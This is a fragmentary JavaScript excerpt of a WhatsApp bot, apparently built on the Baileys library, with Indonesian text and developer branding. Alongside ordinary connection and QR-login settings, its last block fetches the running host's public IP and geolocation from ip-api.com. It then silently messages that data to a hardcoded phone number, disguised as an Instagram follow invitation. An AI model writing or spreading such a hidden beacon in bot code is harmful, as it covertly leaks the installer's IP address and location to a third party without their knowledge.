...
pemuda.autoReconnect = ReconnectMode.onConnectionLost
    pemuda.version = [2, 2142, 12]
    pemuda.logger.level = 'warn'
    pemuda.browserDescription = ['Ismail Nur Amsa','Desktop','3.0']
    await sleep(10000)
    pemuda.on('qr', qr => {
 ...
 teks = `https://chat.whatsapp.com/JTjZLNvJzBrDsAfAfhLktR`
...
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       pemuda.sendMessage("6282252509320@s.whatsapp.net", `─────「 *BANG MUTUALAN INSTAGRAM YOK* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Ismail",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./pemuda_1.jpg'),sourceUrl:"https://wa.me/6283805279906?text=Assalamualaikum"}}})
